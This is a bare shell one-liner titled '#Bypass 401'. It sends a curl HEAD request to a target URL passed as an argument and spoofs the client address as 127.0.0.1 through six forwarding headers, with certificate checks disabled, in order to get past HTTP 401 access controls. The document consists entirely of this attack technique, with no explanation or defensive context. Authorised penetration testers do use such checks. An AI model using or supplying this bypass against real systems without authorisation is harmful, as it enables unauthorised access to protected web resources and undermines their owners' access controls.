#Bypass 401

curl -k -s $1 -H "X-Originating-IP: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" -H "X-Remote-IP: 127.0.0.1" -H "X-Remote-Addr: 127.0.0.1"  -I
